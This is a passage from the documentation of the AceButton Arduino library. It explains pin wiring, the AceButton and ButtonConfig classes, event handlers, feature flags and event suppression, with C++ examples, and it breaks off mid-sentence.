event\nClickVersusDoubleClickUsingBoth\nan example that combines both the \"UsingPressed\" and \"UsingSuppression\" techniques\nDistinguishing Pressed and LongPressed\nexamples/PressedAndLongPressed\nsee also the Distinguishing Pressed and LongPressed subsection below\nCapacitiveButton\nreads a capacitive button using the CapacitiveSensor library\nBinary Encoded Buttons\nEncoded4To2Buttons\ndemo of Encoded4To2ButtonConfig class to decode M=3 buttons with N=2 pins\nEncoded8To3Buttons\ndemo of Encoded8To3ButtonConfig class to decode M=7 buttons with N=3 pins\nEncoded16To4Buttons\ndemo of general M-to-N EncodedButtonConfig class to handle M=15 buttons with N=4 pins\nResistor Ladder Buttons\nLadderButtonCalibrator\nprint out the value returned by analogRead() for various buttons\nuseful to compare the expected values of the resistor ladder versus the actual values returned by the function\nLadderButtons\ndemo of 4 buttons on a single analog pin using analogRead()\nLadderButtonsTiny\n2 buttons on the RESET/A0 pin of an ATtiny85 microcontroller\navoids wasting the RESET pin, saving the other pins for other purposes\ndigitalWriteFast\nSingleButtonFast\nSame as SingleButton but using ButtonConfigFast1<PIN> which uses the digitalWriteFast library\nTwoButtonsUsingOneButtonConfigFast\nSame as TwoButtonsUsingOneButtonConfig but using ButtonConfigFast2<PIN0,PIN1> which uses the digitalWriteFast library\nThreeButtonsUsingOneButtonConfigFast\nSame as ThreeButtonsUsingOneButtonConfig but using ButtonConfigFast3<PIN0,PIN1,PIN2> which uses the digitalWriteFast library\nBenchmarks\nThese are internal benchmark programs. They were not written as examples of how to use the library.\nAutoBenchmark\ngenerates the timing stats (min/average/max) for the AceButton::check() method for various types of events (idle, press/release, click, double-click, and long-press)\nMemoryBenchmark\ndetermines the amount of flash memory consumed by various objects and features of the library\nUsage\nThere are 2 classes and one typedef that a user will normally interact with:\nAceButton (class)\nButtonConfig (class)\nEventHandler (typedef)\nAdvanced usage is supported by:\nEncodedButtonConfig - binary encoded buttons supporting 2^N-1 buttons on N digital pins\nLadderButtonConfig - resistor ladder buttons using analog pins\nIEventHandler - use a callback object instead of a callback function\nWe explain how to use these below.\nInclude Header and Use Namespace\nOnly a single header file AceButton.h is required to use this library. To prevent name clashes with other libraries that the calling code may use, all classes are defined in the ace_button namespace. To use the code without prepending the ace_button:: prefix, use the using directive:\n#include <AceButton.h>\nusing namespace ace_button;\nIf you are dependent on just AceButton, the following might be sufficient:\n#include <AceButton.h>\nusing ace_button::AceButton;\nPin Wiring and Initialization\nThe ButtonConfig class supports the simplest wiring. Each button is connected to a single digital input pin, as shown below. In the example below, 3 buttons labeled S0, S1 and S2 are connected to digital input pins D2, D3, and D4:\nAn Arduino microcontroller pin can be in an OUTPUT mode, an INPUT mode, or an INPUT_PULLUP mode. This mode is controlled by the pinMode() method.\nBy default upon boot, the pin is set to the INPUT mode. However, this INPUT mode puts the pin into a high impedance state, which means that if there is no wire connected to the pin, the voltage on the pin is indeterminate. When the input pin is read (using digitalRead()), the boolean value will be a random value. If you are using the pin in INPUT mode, you must connect an external pull-up resistor (connected to Vcc) or pull-down resistor (connected to ground) so that the voltage level of the pin is defined when there is nothing connected to the pin (i.e. when the button is not pressed).\nThe INPUT_PULLUP mode is a special INPUT mode which tells the microcontroller to connect an internal pull-up resistor to the pin. It is activated by calling pinMode(pin, INPUT_PULLUP) on the given pin. This mode is very convenient because it eliminates the external resistor, making the wiring simpler.\nThe 3 resistors Rc1, Rc2 and Rc3 are optional current limiting resistors. They help protect the microcontroller in the case of misconfiguration. If the pins are accidentally set to OUTPUT mode, then pressing one of the buttons would connect the output pin directly to ground, causing a large amount of current to flow that could permanently damage the microcontroller. The resistance value of 220 ohms (or maybe 330 ohms) is high enough to keep the current within safety limits, but low enough compared to the internal pullup resistor that it is able to pull the digital pin to a logical 0 level. These current limiting resistors are good safety measures, but I admit that I often get lazy and don't use them when doing quick experiments.\nThe AceButton library itself does not call the pinMode() function. The calling application is responsible for calling pinMode(). Normally, this happens in the global setup() method but the call can happen somewhere else if the application requires it. The reason for decoupling the hardware configuration from the AceButton library is mostly because the library does not actually care about the specific hardware wiring of the button. It does not care whether an external resistor is used, or the internal resistor is used. It only cares about whether the resistor is a pull-up or a pull-down.\nSee https://www.arduino.cc/en/Tutorial/DigitalPins for additional information about the I/O pins on an Arduino.\nAceButton Class\nThe AceButton class looks like this (not all public methods are shown):\nnamespace ace_button {\nclass AceButton {\npublic:\nstatic const uint8_t kEventPressed = 0;\nstatic const uint8_t kEventReleased = 1;\nstatic const uint8_t kEventClicked = 2;\nstatic const uint8_t kEventDoubleClicked = 3;\nstatic const uint8_t kEventLongPressed = 4;\nstatic const uint8_t kEventRepeatPressed = 5;\nstatic const uint8_t kEventLongReleased = 6;\nstatic const uint8_t kButtonStateUnknown = 127;\nexplicit AceButton(uint8_t pin = 0, uint8_t defaultReleasedState = HIGH,\nuint8_t id = 0);\nexplicit AceButton(ButtonConfig* buttonConfig, uint8_t pin = 0,\nuint8_t defaultReleasedState = HIGH, uint8_t id = 0);\nvoid init(uint8_t pin = 0, uint8_t defaultReleasedState = HIGH,\nuint8_t id = 0);\nvoid init(ButtonConfig* buttonConfig, uint8_t pin = 0,\nuint8_t defaultReleasedState = HIGH, uint8_t id = 0);\nButtonConfig* getButtonConfig();\nvoid setButtonConfig(ButtonConfig* buttonConfig);\nvoid setEventHandler(ButtonConfig::EventHandler eventHandler);\nuint8_t getPin();\nuint8_t getDefaultReleasedState();\nuint8_t getId();\nvoid check();\n};\n}\nEach physical button will be handled by an instance of AceButton. At a minimum, the instance needs to be told the pin number of the button. This can be done through the constructor:\nconst uint8_t BUTTON_PIN = 2;\nAceButton button(BUTTON_PIN);\nvoid setup() {\npinMode(BUTTON_PIN, INPUT_PULLUP);\n...\n}\nOr we can use the init() method in the setup():\nAceButton button;\nvoid setup() {\npinMode(BUTTON_PIN, INPUT_PULLUP);\nbutton.init(BUTTON_PIN);\n...\n}\nBoth the constructor and the init() function take 3 optional parameters as shown above:\npin: the I/O pin number assigned to the button\ndefaultReleasedState: the logical value of the button when it is in its default \"released\" state (HIGH using a pull-up resistor, LOW for a pull-down resistor)\nid: an optional, user-defined identifier for the button, for example, an index into an array with additional information\nThe pin must be defined either through the constructor or the init() method. But the other two parameters may be optional in many cases.\nSampling Rate\nTo read the state of the button, the AceButton::check() method should be called from the loop() method periodically. Roughly speaking, this should be about 4 times faster than the value of getDebounceDelay() so that the various event detection logic can work properly. For example, for the default debounce delay is 20 ms, AceButton::check() should be called every 5 ms. I have successfully experimented with using a sampling delay as large as 10 ms, but I recommend about 5 ms in most cases.\nYou could call the AceButton::check() method directly in the global loop() function like this:\nvoid loop() {\n...\nbutton.check();\n...\n}\nThis would sample the button as fast as possible on your particular microprocessor, perhaps as fast as 10,000 or 100,000 times a second, depending on the other code that is in the loop() function.\nMost of the time, a high sampling rate is not a problem except for 2 things:\nCalling the AceButton::check() has a small overhead and your processor could be doing other things during that time.\nIf you use Resistor Ladder Buttons described below, on an ESP8266, you will trigger a bug that causes the WiFi to disconnect if you sample the analogRead() function more than a 1000 times/second.\nIf you want to limit the sampling rate, see the example code in Rate Limit CheckButtons. The code relies on using a static variable to implement a non-blocking delay, like this:\nAceButton button;\n...\nvoid checkButtons() {\nstatic uint16_t prev = millis();\n// DO NOT USE delay(5) to do this.\n// The (uint16_t) cast is required on 32-bit processors, harmless on 8-bit.\nuint16_t now = millis();\nif ((uint16_t) (now - prev) >= 5) {\nbutton.check();\nprev = now;\n}\n}\nvoid loop() {\ncheckButtons();\n...\n}\nCompiler Error On Pin 0\nIf you attempt to use Pin 0 in the AceButton() constructor:\nAceButton button(0);\nyou may encounter a compile-time error such as this:\nerror: call of overloaded 'AceButton(int)' is ambiguous\nThe solution is to explicitly cast the 0 to a uint8_t type, or to assign it explicitly to a uint8_t const, like this:\n// Explicit cast\nAceButton button((uint8_t) 0);\n// Or assign to a const first.\nstatic const uint8_t PIN = 0;\nAceButton button(PIN);\nSee Issue #40 for details.\nButtonConfig Class\nThe core concept of the AceButton library is the separation of the button (AceButton) from its configuration (ButtonConfig).\nThe AceButton class has the logic for debouncing and detecting the various events (Pressed, Released, etc), and the various bookkeeping variables needed to implement the logic. These variables are associated with the specific instance of that AceButton.\nThe ButtonConfig class has the various timing parameters which control how much time is needed to detect certain events. This class also has the ability to override the default methods for reading the pin (readButton()) and the clock (getClock()). This ability allows unit tests to be written.\nThe class looks like this (not all public methods are shown):\nnamespace ace_button {\nclass ButtonConfig {\npublic:\nstatic const uint16_t kDebounceDelay = 20;\nstatic const uint16_t kClickDelay = 200;\nstatic const uint16_t kDoubleClickDelay = 400;\nstatic const uint16_t kLongPressDelay = 1000;\nstatic const uint16_t kRepeatPressDelay = 1000;\nstatic const uint16_t kRepeatPressInterval = 200;\ntypedef uint16_t FeatureFlagType;\nstatic const FeatureFlagType kFeatureClick = 0x01;\nstatic const FeatureFlagType kFeatureDoubleClick = 0x02;\nstatic const FeatureFlagType kFeatureLongPress = 0x04;\nstatic const FeatureFlagType kFeatureRepeatPress = 0x08;\nstatic const FeatureFlagType kFeatureSuppressAfterClick = 0x10;\nstatic const FeatureFlagType kFeatureSuppressAfterDoubleClick = 0x20;\nstatic const FeatureFlagType kFeatureSuppressAfterLongPress = 0x40;\nstatic const FeatureFlagType kFeatureSuppressAfterRepeatPress = 0x80;\nstatic const FeatureFlagType kFeatureSuppressClickBeforeDoubleClick = 0x100;\nstatic const FeatureFlagType kFeatureSuppressAll = (\nkFeatureSuppressAfterClick\n| kFeatureSuppressAfterDoubleClick\n| kFeatureSuppressAfterLongPress\n| kFeatureSuppressAfterRepeatPress\n| kFeatureSuppressClickBeforeDoubleClick);\ntypedef void (*EventHandler)(AceButton* button, uint8_t eventType,\nuint8_t buttonState);\nButtonConfig() = default;\nuint16_t getDebounceDelay();\nuint16_t getClickDelay();\nuint16_t getDoubleClickDelay();\nuint16_t getLongPressDelay();\nuint16_t getRepeatPressDelay();\nuint16_t getRepeatPressInterval();\nvoid setDebounceDelay(uint16_t debounceDelay);\nvoid setClickDelay(uint16_t clickDelay);\nvoid setDoubleClickDelay(uint16_t doubleClickDelay);\nvoid setLongPressDelay(uint16_t longPressDelay);\nvoid setRepeatPressDelay(uint16_t repeatPressDelay);\nvoid setRepeatPressInterval(uint16_t repeatPressInterval);\nvirtual unsigned long getClock();\nvirtual int readButton(uint8_t pin);\nbool isFeature(FeatureFlagType features);\nvoid setFeature(FeatureFlagType features);\nvoid clearFeature(FeatureFlagType features);\nvoid resetFeatures();\nvoid setEventHandler(EventHandler eventHandler);\nvoid setIEventHandler(IEventHandler* eventHandler);\nstatic ButtonConfig* getSystemButtonConfig();\n};\n}\nThe ButtonConfig (or a customized subclass) can be created and assigned to one or more AceButton instances using dependency injection through the AceButton(ButtonConfig*) constructor. This constructor also accepts the same (pin, defaultReleasedState, id) parameters as init(pin, defaultReleasedState, id) method. Sometimes it's easier to set all the parameters in one place using the constructor. Other times, the parameters are not known until the AceButton::init() method can be called from the global setup() method.\nconst uint8_t PIN1 = 2;\nconst uint8_t PIN2 = 4;\nButtonConfig buttonConfig;\nAceButton button1(&buttonConfig, PIN1);\nAceButton button2(&buttonConfig, PIN2);\nvoid setup() {\npinMode(PIN1, INPUT_PULLUP);\npinMode(PIN2, INPUT_PULLUP);\n...\n}\nAnother way to inject the ButtonConfig dependency is to use the AceButton::setButtonConfig() method but it is recommended that you use the constructor instead because the dependency is easier to follow.\nSystem ButtonConfig\nA single instance of ButtonConfig called the \"System ButtonConfig\" is automatically created by the library at startup. By default, all instances of AceButton are automatically assigned to this singleton instance. We explain in the Single Button Simplifications section below how this simplifies the code needed to handle a single button.\nConfiguring the EventHandler\nThe ButtonConfig class provides a number of methods which are mostly used internally by the AceButton class. The one method which is expected to be used by the calling client code is setEventHandler() which assigns the user-defined EventHandler callback function to the ButtonConfig instance. This is explained in more detail below in the EventHandler section below.\nTiming Parameters\nHere are the methods to retrieve the timing parameters:\nuint16_t getDebounceDelay(); (default: 20 ms)\nuint16_t getClickDelay(); (default: 200 ms)\nuint16_t getDoubleClickDelay(); (default: 400 ms)\nuint16_t getLongPressDelay(); (default: 1000 ms)\nuint16_t getRepeatPressDelay(); (default: 1000 ms)\nuint16_t getRepeatPressInterval(); (default: 200 ms)\nThe default values of each timing parameter can be changed at run-time using the following methods:\nvoid setDebounceDelay(uint16_t debounceDelay);\nvoid setClickDelay(uint16_t clickDelay);\nvoid setDoubleClickDelay(uint16_t doubleClickDelay);\nvoid setLongPressDelay(uint16_t longPressDelay);\nvoid setRepeatPressDelay(uint16_t repeatPressDelay);\nvoid setRepeatPressInterval(uint16_t repeatPressInterval);\nHardware Dependencies\nThe ButtonConfig class has 2 methods which provide hooks to its external hardware dependencies:\nvirtual unsigned long getClock();\nvirtual int readButton(uint8_t pin);\nBy default these are mapped to the underlying Arduino system functions respectively:\nmillis()\ndigitalRead()\nUnit tests are possible because these methods are virtual and the hardware dependencies can be swapped out with fake ones.\nMultiple ButtonConfig Instances\nWe have assumed that there is a 1-to-many relationship between a ButtonConfig and the AceButton. In other words, multiple buttons will normally be associated with a single configuration. Each AceButton has a pointer to an instance of ButtonConfig. So the cost of separating the ButtonConfig from AceButton is 2 bytes in each instance of AceButton. Note that this is equivalent to adding virtual methods to AceButton (which would add 2 bytes), so in terms of static RAM size, this is a wash.\nThe library is designed to handle multiple buttons, and it assumes that the buttons are normally grouped together into a handful of types. For example, consider the buttons of a car radio. It has several types of buttons:\nthe tuner buttons (2, up and down)\nthe preset buttons (6)\nthe AM/FM band button (1)\nIn this example, there are 9 buttons, but only 3 instances of ButtonConfig would be needed.\nEventHandler Typedef\nThe event handler is a callback function that gets called when the AceButton class determines that an interesting event happened on the button. The advantage of this mechanism is that all the complicated logic of determining the various events happens inside the AceButton class, and the user will normally not need to worry about the details.\nEventHandler Signature\nThe event handler is defined in the ButtonConfig class and has the following signature:\nclass ButtonConfig {\npublic:\ntypedef void (*EventHandler)(AceButton* button, uint8_t eventType,\nuint8_t buttonState);\n...\n};\nThe event handler is registered with the ButtonConfig object, not with the AceButton object, although the convenience method AceButton::setEventHandler() is provided as a pass-through to the underlying ButtonConfig (see the Single Button Simplifications section below):\nButtonConfig buttonConfig;\nvoid handleEvent(AceButton* button, uint8_t eventType, uint8_t buttonState) {\n...\n}\nvoid setup() {\n...\nbuttonConfig.setEventHandler(handleEvent);\n...\n}\nThe motivation for this design is to save static memory. If multiple buttons are associated with a single ButtonConfig, then it is not necessary for every button of that type to hold the same pointer to the EventHandler function. It is only necessary to save that information once, in the ButtonConfig object.\nPro Tip 1: Comment out the unused parameter(s) in the handleEvent() method to avoid the unused parameter compiler warning:\nvoid handleEvent(AceButton* /*button*/, uint8_t eventType,\nuint8_t /*buttonState*/) {\n...\n}\nThe Arduino sketch compiler can get confused with the parameters commented out, so you may need to add a forward declaration for the handleEvent() method before the setup() method:\nvoid handleEvent(AceButton*, uint8_t, uint8_t);\nPro Tips 2: The event handler can be an object instead of just a function pointer. An object-based event handler can be useful in more complex applications with numerous buttons. See the section on Object-based Event Handler in the Advanced Topics below.\nEventHandler Parameters\nThe EventHandler function receives 3 parameters from the AceButton:\nbutton\npointer to the AceButton instance that generated this event\ncan be used to retrieve the getPin() or the getId()\neventType\nthe type of this event given by the various AceButton::kEventXxx constants\nbuttonState\nthe HIGH or LOW button state that generated this event\nThe button pointer should be used only to extract information about the button that triggered the event. It should not be used to modify the button's internal variables in any way within the eventHandler. The logic in AceButton::check() assumes that those internal variable are held constant, and if they are changed by the eventHandler, unpredictable results may occur. (I should have made the button be a const AceButton* but by the time I realized this, there were too many users of the library already, and I did not want to make a breaking change to the API.)\nIf you are using only a single button, then you should need to check only the eventType.\nIt is not expected that buttonState will be needed very often. It should be sufficient to examine just the eventType to determine the action that needs to be performed. Part of the difficulty with this parameter is that it has the value of LOW or HIGH, but the physical interpretation of those values depends on whether the button was wired with a pull-up or pull-down resistor. Use the helper function button->isReleased(buttonState) to translate the raw buttonState into a more meaningful determination if you need it.\nOne EventHandler Per ButtonConfig\nOnly a single EventHandler per ButtonConfig is supported. An alternative would have been to register a separate event handler for each of the 6 kEventXxx events. But each callback function requires 2 bytes of memory, and it was assumed that in most cases, the calling client code would be interested in only a few of these event types, so it seemed wasteful to allocate 12 bytes when most of these would be unused. If the client code really wanted separate event handlers, it can be easily emulated by invoking them through the main event handler:\nvoid handleEvent(AceButton* button, uint8_t eventType, uint8_t buttonState) {\nswitch (eventType) {\ncase AceButton::kEventPressed:\nhandleEventPressed(button, eventType, buttonState);\nbreak;\ncase AceButton::kEventReleased:\nhandleEventReleased(button, eventType, buttonState);\nbreak;\n...\n}\n}\nEventHandler Tips\nThe Arduino runtime environment is single-threaded, so the EventHandler is called in the middle of the AceButton::check() method, in the same thread as the check() method. It is therefore important to write the EventHandler code to run somewhat quickly, so that the delay doesn't negatively impact the logic of the AceButton::check() algorithm. Since AceButton::check() should run approximately every 5 ms, the user-provided EventHandler should run somewhat faster than 5 ms. Given a choice, it is probably better to use the EventHandler to set some flags or variables and return quickly, then do additional processing from the loop() method.\nSometimes it is too convenient or unavoidable to perform a long-running operation inside the event handler (e.g. making an HTTP). This is fine, I have done this occasionally. Just be aware that the button scanning operation will not work during that long-running operation.\nSpeaking of threads, the API of the AceButton Library was designed to work in a multi-threaded environment, if that situation were to occur in the Arduino world.\nEvent Types\nThe supported events are defined by a list of constants in AceButton.h:\nAceButton::kEventPressed (always enabled, cannot be suppressed)\nAceButton::kEventReleased (default: enabled)\nAceButton::kEventClicked (default: disabled)\nAceButton::kEventDoubleClicked (default: disabled)\nAceButton::kEventLongPressed (default: disabled)\nAceButton::kEventRepeatPressed (default: disabled)\nAceButton::kEventLongReleased (default: disabled, autoenabled by kFeatureSuppressAfterLongPress, new for v1.8)\nThese values are sent to the EventHandler in the eventType parameter.\nTwo of the events are enabled by default, four are disabled by default but can be enabled by using a Feature flag described below.\nButtonConfig Feature Flags\nThere are 9 flags defined in ButtonConfig which can control the behavior of AceButton event handling:\nButtonConfig::kFeatureClick\nButtonConfig::kFeatureDoubleClick\nButtonConfig::kFeatureLongPress\nButtonConfig::kFeatureRepeatPress\nButtonConfig::kFeatureSuppressAfterClick\nButtonConfig::kFeatureSuppressAfterDoubleClick\nButtonConfig::kFeatureSuppressAfterLongPress\nButtonConfig::kFeatureSuppressAfterRepeatPress\nButtonConfig::kFeatureSuppressClickBeforeDoubleClick\nButtonConfig::kFeatureSuppressAll\nThese constants are used to set or clear the given flag:\n// Get the current config.\nButtonConfig* config = button.getButtonConfig();\n// Set a specific feature\nconfig->setFeature(ButtonConfig::kFeatureLongPress);\n// Clear a specific feature\nconfig->clearFeature(ButtonConfig::kFeatureLongPress);\n// Test for a specific feature\nif (config->isFeature(ButtonConfig::kFeatureLongPress)) {\n...\n}\n// Clear all features\nconfig->resetFeatures()\nThe meaning of these flags are described below.\nEvent Activation\nOf the 7 event types, 5 are disabled by default:\nAceButton::kEventClicked\nAceButton::kEventDoubleClicked\nAceButton::kEventLongPressed\nAceButton::kEventRepeatPressed\nAceButton::kEventLongReleased\nTo receive these events, call ButtonConfig::setFeature() with the following corresponding flags:\nButtonConfig::kFeatureClick\nButtonConfig::kFeatureDoubleClick\nButtonConfig::kFeatureLongPress\nButtonConfig::kFeatureRepeatPress\nButtonConfig::kFeatureSuppressAfterLongPress (suppresses kEventReleased after a LongPress, but turns on kEventLongReleased as a side effect)\nTo disable these events, call ButtonConfig::clearFeature() with one of these flags.\nEnabling kFeatureDoubleClick automatically enables kFeatureClick, because we need to have a Clicked event before a DoubleClicked event can be detected.\nIt seems unlikely that both LongPress and RepeatPress events would be useful at the same time, but both event types can be activated if you need it.\nEvent Suppression\nEvent types can be considered to be built up in layers, starting with the lowest level primitive events: Pressed and Released. Higher level events are built on top of the lower level events through various timing delays. When a higher level event is detected, it is sometimes useful to suppress the lower level event that was used to detect the higher level event.\nFor example, a Clicked event requires a Pressed event followed by a Released event within a ButtonConfig::getClickDelay() milliseconds (200 ms by default). The Pressed event is always generated. If a Clicked event is detected, we could choose to generate both a Released event and a Clicked event, and this is the default behavior.\nHowever, many times, it is useful to suppress the Released event if the Clicked event is detected. The ButtonConfig can be configured to suppress these lower level events. Call the setFeature(feature) method passing the various kFeatureSuppressXxx constants:\nButtonConfig::kFeatureSuppressAfterClick\nsuppresses the kEventReleased event after a Clicked event is detected\nalso suppresses the Released event from the first Clicked of a DoubleClicked, since kFeatureDoubleClick automatically enables kFeatureClick\nButtonConfig::kFeatureSuppressAfterDoubleClick\nsuppresses the kEventReleased event and the second Clicked event if a DoubleClicked event is detected\nButtonConfig::kFeatureSuppressAfterLongPress\nsuppresses the kEventReleased event if a LongPressed event is detected\n(v1.8) automatically enables kEventLongReleased event as a substitute for the suppressed kEventReleased, see Distinguishing Pressed and Long Pressed subsection below for more details.\nButtonConfig::kFeatureSuppressAfterRepeatPress\nsuppresses the kEventReleased event after the last RepeatPressed event\nButtonConfig::kFeatureSuppressClickBeforeDoubleClick\nThe first kEventClicked event is postponed by getDoubleClickDelay() millis until the code can determine if a DoubleClick has occurred. If so, then the postponed kEventClicked message to the EventHandler is suppressed.\nSee Distinguishing Clicked and DoubleClicked subsection below for more info.\nButtonConfig::kFeatureSuppressAll\na convenience parameter that is the equivalent of suppressing all of the previous events\nBy default, no suppression is performed.\nAs an example, to suppress the kEventReleased after a kEventLongPressed (this is actually often the case), you would do this:\nButtonConfig* config = button.getButtonConfig();\nconfig->setFeature(ButtonConfig::kFeatureSuppressAfterLongPress);\nThe special convenient constant kFeatureSuppressAll is equivalent of using all suppression constants:\nButtonConfig* config = button.getButtonConfig();\nconfig->setFeature(ButtonConfig::kFeatureSuppressAll);\nAll suppressions can be cleared by using:\nButtonConfig* config = button.getButtonConfig();\nconfig->clearFeature(ButtonConfig::kFeatureSuppressAll);\nNote, however, that the isFeature(ButtonConfig::kFeatureSuppressAll) currently means \"isAnyFeature() implemented?\" not \"areAllFeatures() implemented?\" We don't expect isFeature() to be used often (or at all) for kFeatureSuppressAll.\nYou can clear all feature at once using:\nButtonConfig* config = button.getButtonConfig();\nconfig->resetFeatures();\nThis is useful if you want to reuse a ButtonConfig instance and you want to reset its feature flags to its initial state.\nSingle Button Simplifications\nAlthough the AceButton library is designed to shine for multiple buttons, you may want to use it to handle just one button. The library provides some features to make this simple case easy.\nThe library automatically creates one instance of ButtonConfig called a \"System ButtonConfig\". This System ButtonConfig can be retrieved using the class static method ButtonConfig::getSystemButtonConfig().\nEvery instance of AceButton is assigned an instance of the System ButtonConfig by default (which can be overridden manually).\nA convenience method allows the EventHandler for the System ButtonConfig to be set easily through AceButton itself, instead of having to get the System ButtonConfig first, then set the event handler. In other words, button.setEventHandler(handleEvent) is a synonym for button.getButtonConfig()->setEventHandler(handleEvent).\nThese simplifying features allow a single button to be configured and used like this:\nAceButton button(BUTTON_PIN);\nvoid setup() {\npinMode(BUTTON_PIN, INPUT_PULLUP);\nbutton.setEventHandler(handleEvent);\n...\n}\nvoid loop() {\nbutton.check();\n}\nvoid handleEvent(AceButton* button, uint8_t eventType, uint8_t buttonState) {\n...\n}\nTo configure the System ButtonConfig, you may need to add something like this to the setup() section:\nbutton.getButtonConfig()->setFeature(ButtonConfig::kFeatureLongPress);\nMultiple Buttons\nWhen transitioning from a single button to multiple buttons, it's important to remember what's happening underneath the convenience methods. The single AceButton button is assigned to the System ButtonConfig that was created automatically. When an EventHandler is assigned to the button, it is actually assigned to the System ButtonConfig. All subsequent instances of AceButton will also be associated with this event handler, unless another ButtonConfig is explicitly assigned.\nThere are at least 2 ways you can configure multiple buttons.\nOption 1: Multiple ButtonConfigs\n#include <AceButton.h>\nusing namespace ace_button;\nButtonConfig config1;\nAceButton button1(&config1);\nButtonConfig config2;\nAceButton button2(&config2);\nvoid button1Handler(AceButton* button, uint8_t eventType, uint8_t buttonState) {\nSerial.println(\"button1\");\n}\nvoid button2Handler(AceButton* button, uint8_t eventType, uint8_t buttonState) {\nSerial.println(\"button2\");\n}\nvoid setup() {\nSerial.begin(115200);\npinMode(6, INPUT_PULLUP);\npinMode(7, INPUT_PULLUP);\nconfig1.setEventHandler(button1Handler);\nconfig2.setEventHandler(button2Handler);\nbutton1.init(6);\nbutton2.init(7);\n}\nvoid loop() {\nbutton1.check();\nbutton2.check();\n}\nSee the example sketch TwoButtonsUsingTwoButtonConfigs which uses 2 ButtonConfig instances to configure 2 AceButton instances.\nOption 2: Multiple Button Discriminators\nAnother technique keeps the single system ButtonConfig and the single EventHandler, but use the AceButton::getPin() to discriminate between the multiple buttons:\n#include <AceButton.h>\nusing namespace ace_button;\nAceButton button1(6);\nAceButton button2(7);\nvoid button1Handler(AceButton* button, uint8_t eventType, uint8_t buttonState) {\nSerial.println(\"button1\");\n}\nvoid button2Handler(AceButton* button, uint8_t eventType, uint8_t buttonState) {\nSerial.println(\"button2\");\n}\nvoid buttonHandler(AceButton* button, uint8_t eventType, uint8_t buttonState) {\nswitch (button->getPin()) {\ncase 6:\nbutton1Handler(button, eventType, buttonState);\nbreak;\ncase 7:\nbutton2Handler(button, eventType, buttonState);\nbreak;\n}\n}\nvoid setup() {\nSerial.begin(115200);\npinMode(6, INPUT_PULLUP);\npinMode(7, INPUT_PULLUP);\nButtonConfig* config = ButtonConfig::getSystemButtonConfig();\nconfig->setEventHandler(buttonHandler);\n}\nvoid loop() {\nbutton1.check();\nbutton2.check();\n}\nSee the example code TwoButtonsUsingOneButtonConfig. which uses a single ButtonConfig instance to handle 2 AceButton instances.\nSometimes, it is more convenient to use the AceButton::getId() method to identify the button instead of the AceButton::getPin(). See ArrayButtons for an example.\nAdvanced Topics\nObject-based Event Handler\nThe EventHandler is a typedef that is defined to be a function pointer. This is a simple, low-overhead design that produces the smallest memory footprint, and allows the event handler to be written with the smallest amount of boilerplate code. The user does not have to override a class.\nIn more complex applications involving larger number of AceButton and ButtonConfig objects, it is often useful for the EventHandler to be an object instead of a simple function pointer. This is especially true if the application uses Object Oriented Programming (OOP) techniques for modularity and encapsulation. Using an object as the event handler allows additional context information to be injected into the event handler.\nTo support OOP techniques, AceButton v1.6 adds:\nIEventHandler interface class\ncontains a single pure virtual function handleEvent()\nButtonConfig::setIEventHandler() method\naccepts a pointer to an instance of the IEventHandler interface.\nThe IEventHandler interface is simply this:\nclass IEventHandler {\npublic:\nvirtual void handleEvent(AceButton* button, uint8_t eventType,\nuint8_t buttonState) = 0;\n};\nAt least one of ButtonConfig::setEventHandler() or ButtonConfig::setIEventHandler() must be called before events are actually dispatched. If both are called, the last one takes precedence.\nSee examples/SingleButtonUsingIEventHandler for an example.\nDistinguishing Clicked and DoubleClicked\nOn a project using only a small number of buttons (due to physical limits or the limited availability of pins), it may be desirable to distinguish between a single Clicked event and a DoubleClicked event from a single button. This is a challenging problem to solve because fundamentally, a DoubleClicked event must always generate a Clicked event, because a Clicked event must happen before it can become a DoubleClicked event.\nNotice that on a desktop computer (running Windows, MacOS or Linux), a double-click on a mouse always generates both a Clicked and a DoubleClicked. The first Click selects the given desktop object (e.g. an icon or a window), and the DoubleClick performs some action on the selected object (e.g. open the icon, or resize the window).\nThe AceButton Library provides 3 solutions which may work for some projects:\nMethod 1: The kFeatureSuppressClickBeforeDoubleClick flag causes the first Clicked event to be detected, but the posting of the event message (i.e. the call to the EventHandler) is postponed until the state of the DoubleClicked can be determined. If the DoubleClicked happens, then the first Clicked event message is suppressed. If DoubleClicked does not occur, the long delayed Clicked message is sent via the EventHandler.\nThere are two noticeable disadvantages of this method. First, the response time of all Clicked events is delayed by about 600 ms (kClickDelay + kDoubleClickDelay) whether or not the DoubleClicked event happens. Second, the user may not be able to accurately produce a Clicked event (due to the physical characteristics of the button, or the user's dexterity).\nIt may also be worth noting that only the Clicked event is postponed. The accompanying Released event of the Clicked event is not postponed. So a single click action (without a DoubleClick) produces the following sequence of events to the EventHandler:\nkEventPressed - at time 0ms\nkEventReleased - at time 200ms\nkEventClicked - at time 600ms (200ms + 400ms)\nThe ButtonConfig configuration looks like this:\nButtonConfig* buttonConfig = button.getButtonConfig();\nbuttonConfig->setFeature(ButtonConfig::kFeatureDoubleClick);\nbuttonConfig->setFeature(\nButtonConfig::kFeatureSuppressClickBeforeDoubleClick);\nSee the example code at examples/ClickVersusDoubleClickUsingSuppression/.\nMethod 2: A viable alternative is to use the Released event instead of the Clicked event to distinguish it from the DoubleClicked. For this method to work, we need to suppress the Released event after both Clicked and DoubleClicked.\nThe advantage of using this method is that there is no response time lag in the handling of the Released event. To the user, there is almost no difference between triggering on the Released event, versus triggering on the Clicked event.\nThe disadvantage of this method is that the Clicked event must be be ignored (because of the spurious Clicked event generated by the DoubleClicked). If the user accidentally presses and releases the button too quickly, it generates a Clicked event, which will cause the program to do nothing.\nThe ButtonConfig configuration looks like this:\nButtonConfig* buttonConfig = button.getButtonConfig();\nbuttonConfig->setEventHandler(handleEvent);\nbuttonConfig->setFeature(ButtonConfig::kFeatureDoubleClick);\nbuttonConfig->setFeature(ButtonConfig::kFeatureSuppressAfterClick);\nbuttonConfig->setFeature(ButtonConfig::kFeatureSuppressAfterDoubleClick);\nSee the example code at examples/ClickVersusDoubleClickUsingReleased/.\nMethod 3: We could actually combine both Methods 1 and 2 so that either Released or a delayed Click is considered to be a \"Click\". This may be the best of both worlds.\nThe ButtonConfig configuration looks like this:\nButtonConfig* buttonConfig = button.getButtonConfig();\nbuttonConfig->setEventHandler(handleEvent);\nbuttonConfig->setFeature(ButtonConfig::kFeatureDoubleClick);\nbuttonConfig->setFeature(\nButtonConfig::kFeatureSuppressClickBeforeDoubleClick);\nbuttonConfig->setFeature(ButtonConfig::kFeatureSuppressAfterClick);\nbuttonConfig->setFeature(ButtonConfig::kFeatureSuppressAfterDoubleClick);\nSee the example code at 